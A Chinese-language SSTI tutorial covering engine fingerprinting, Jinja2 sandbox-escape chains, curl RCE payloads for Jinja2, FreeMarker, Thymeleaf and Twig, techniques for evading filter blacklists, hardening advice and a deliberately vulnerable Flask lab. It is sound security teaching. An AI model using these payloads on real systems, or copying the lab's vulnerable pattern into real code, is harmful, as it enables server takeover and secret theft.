# R10.3 伺服器端範本解譯引擎注入 (Server-Side Template Injection)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**伺服器端範本引擎注入 (SSTI)** 的物理成因在於**開發者混淆了「範本語法源碼 (Template Source)」與「資料上下文 (Context Data)」的邊界**。當應用程式直接將不可信字串拼接至範本源碼並送入引擎編譯時，範本解譯器的詞法分析器將惡意輸入識別為原生範本指令 (Template Directives)，攻擊者藉此濫用範本引擎內建之表達式求值能力，逐步突破執行沙箱 (Sandbox Escape)，最終透過物件導向之方法解析順序 (MRO) 或類別載入器 (ClassLoader) 達成伺服器端任意程式碼執行 (RCE)。

```
[客戶端未過濾字串輸入] ── {{ 7 * 7 }} 或 {{ config.items() }}
                                │
                                ▼ [後端錯誤呼叫: render_template_string("Hello " + user_input)]
[範本編譯引擎 (Jinja2/Twig)] ──► 詞法剖析器識別到 {{...}} 標籤，視為可執行程式碼邏輯
                                │
                                ▼ 觸發表達式動態求值 (Evaluation)
┌───────────────────────────────┴───────────────────────────────┐
│ [階層 1: 資訊洩漏] 讀取伺服器內部環境變數、SECRET_KEY、資料庫密碼│
│ [階層 2: 沙箱逃逸] 透過 __class__.__base__.__subclasses__()   │
│ [階層 3: 任意命令] 遍歷載入 subprocess.Popen 觸發核心 RCE     │
└───────────────────────────────┬───────────────────────────────┘
                                ▼
[作業系統行程執行] ──► 於應用伺服器行程權限下執行任意指令！
```

## 🔬 第一動：範本引擎識別決策與物件遍歷原理 (Mechanics & Engine Fingerprinting)

### 1. 範本引擎主流判別語法樹 (Decision Matrix)

| 測試 Payload | 預期運算結果 | 命中技術堆疊 |
| :--- | :--- | :--- |
| `${7*7}` | 回顯 `49` | Java 系列 (FreeMarker, Thymeleaf, Velocity, JSP EL) |
| `{{7*7}}` | 回顯 `49` | Python / PHP (Jinja2, Twig, Django, Tornado) |
| `{{7*'7'}}` | 回顯 `7777777` (字串乘法) | **Jinja2** (Python 語法特性) |
| `{{7*'7'}}` | 回顯 `49` (隱式轉型) | **Twig** (PHP 語法特性) |
| `<%= 7*7 %>` | 回顯 `49` | Ruby (ERB) / Node.js (EJS) |

### 2. Python Jinja2 原型鏈遍歷物理鏈路
```
"".__class__ (str) 
  └── .__mro__[1] (object) 
        └── .__subclasses__() (獲取記憶體中所有註冊類別)
              └── [N] (定位 subprocess.Popen 或 os._wrap_close)
                    └── .__init__.__globals__['popen']('id').read()
```

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 主流範本引擎武器化利用 Payload 表

```bash
# 1. Python Jinja2 經典沙箱逃逸與 RCE 觸發
curl "https://target.corp.internal/page?name={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}"

# 2. Java FreeMarker 官方功能直接執行命令 (無沙箱預設情境)
curl -X POST "https://target.corp.internal/preview" \
    -d "template=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"

# 3. Java Thymeleaf 預算式表達式注入 (Thymeleaf Expression Injection)
# 注入 __${...}__ 觸發 Spring Expression Language (SpEL)
curl "https://target.corp.internal/doc/__\${T(java.lang.Runtime).getRuntime().exec('calc')}__::.x"

# 4. PHP Twig 沙箱繞過 (呼叫 _self.env.registerUndefinedFilterCallback)
curl "https://target.corp.internal/view?id={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
```

## 🥷 第三動：防禦規避與日誌特徵操控 (Evasion & Obfuscation)

### 1. 關鍵字與特殊符號黑名單規避技術

| 屏蔽特徵 | 規避替代技術 | 物理原理說明 |
| :--- | :--- | :--- |
| **禁止底線 `_`** | `request['args']['class']` 或 `\x5f\x5fclass\x5f\x5f` | 透過 HTTP 額外參數或十六進位轉義字元動態組裝字串 |
| **禁止點號 `.`** | `attr(request, "args")` 或 `['__class__']` | 利用 Python 字典括號存取或 Jinja2 內建 `attr()` 過濾器 |
| **禁止單雙引號** | `dict(__class__=1).keys()[0]` 或 `request.headers.cmd` | 利用物件型態轉換或從 HTTP Header 借道傳遞字串 |
| **禁止大括號 `{{`** | `{% print(config) %}` 或 `{% if ... %}` | 切換為範本流程控制區塊標籤 (Block Tags) |

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **嚴禁動態拼接編譯範本字串**：
   - 杜絕使用 `render_template_string(dynamic_string)`。
   - 永遠僅渲染固定檔案範本，並以參數方式傳入資料：
     ```python
     # 安全: 靜態範本檔案，資料透過 context 變數安全隔離
     return render_template("profile.html", username=user_input)
     ```
2. **採用受限安全沙箱模式 (Sandboxed Environment)**：
   - 若業務必須允許使用者自訂範本，強制啟用 `jinja2.sandbox.SandboxedEnvironment`，嚴格攔截對 `__class__`、`__subclasses__` 等私有屬性之存取。
3. **關閉危險內建擴展 (Engine Hardening)**：
   - FreeMarker：設定 `new_builtin_class_resolver = TemplateClassResolver.ALLOWS_NOTHING_RESOLVER`。
   - Thymeleaf：強制使用標準視圖解析器，禁止動態路徑拼接直接轉化為 Template Fragment。

## 🧪 實戰演練環境搭建 (Environment & Lab Setup)

### 1. 極簡 SSTI 靶機端點 (Python Flask + Jinja2, 20 行)
```python
# app.py
from flask import Flask, request, render_template_string

app = Flask(__name__)
app.config["SECRET_KEY"] = "FLAG{TEMPLATE_ENGINE_BOUNDARY_CORRUPT}"

@app.route("/")
def index():
    name = request.args.get("name", "Guest")
    # 脆弱點：直接將不可信使用者字串拼接進範本源碼編譯
    template = f"<h1>Welcome to the portal, {name}!</h1>"
    return render_template_string(template)

if __name__ == "__main__":
    app.run(port=8888)
```

### 2. 三步作戰驗證流程
```bash
# 步驟 1: 啟動靶機
python3 app.py

# 步驟 2: 驗證範本求值並讀取應用程式核心 SECRET_KEY
curl "http://127.0.0.1:8888/?name={{config['SECRET_KEY']}}"
# 驗證輸出：<h1>Welcome to the portal, FLAG{TEMPLATE_ENGINE_BOUNDARY_CORRUPT}!</h1>

# 步驟 3: 驗證工程修復（修改代碼改用 render_template_string("<h1>Welcome, {{name}}</h1>", name=name)）
# 驗證輸出：<h1>Welcome, {{config['SECRET_KEY']}}</h1> (被安全轉義為純字串，漏洞消除)
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：SSTI 與客戶端 XSS 的最根本邊界分水嶺為何？**
  - **戰術思維**：XSS 的解譯器為**瀏覽器 (Client-side JavaScript Engine)**，攻擊承載於客戶端執行；SSTI 的解譯器為**伺服器端核心執行緒 (Server-side Runtime)**，輸入被編譯進伺服器記憶體環境，具備直接滲透至伺服器檔案系統、環境變數與核心行程的能力。
- [ ] **Q2：在 Python Jinja2 中，為何 `{{ config.from_object('os') }}` 可被紅隊利用？**
  - **戰術思維**：`config` 是 Flask 注入全域變數之字典物件，其具備 `from_object()` 方法可將指定模組的所有大寫屬性導入 config 中，紅隊可藉此間接把底層高危模組導入執行環境。
- [ ] **Q3：在極度受限的環境下，無回顯 SSTI (Blind SSTI) 應如何確認漏洞存在？**
  - **戰術思維**：利用範本引擎之重運算或延時指令，例如 Jinja2 下遍歷大量空迴圈造成 CPU 密集延遲，或在 Java 範本中調用 `Thread.sleep(5000)` 觀測 HTTP 封包延時。
- [ ] **Q4：Logicless Template 引擎（如 Mustache, Handlebars）是否絕對免疫 SSTI？**
  - **戰術思維**：雖然邏輯簡化引擎不支援任意表達式求值，但若引擎配置了不安全的 Helpers 註冊機制，或在 Node.js 下因原型鏈污染 (Prototype Pollution) 注入惡意模板屬性，依然可能轉化為 RCE。
- [ ] **Q5：為何 FreeMarker 在啟用沙箱後，仍需特別防範 `<#include ...>` 標籤？**
  - **戰術思維**：即便關閉了 `Execute` 類別解析，範本引擎內建之檔案包含標籤可能允許讀取本機任意檔案 (`/etc/passwd`) 或存取網路 URL，導致嚴重的 SSRF 與本機機密外洩。
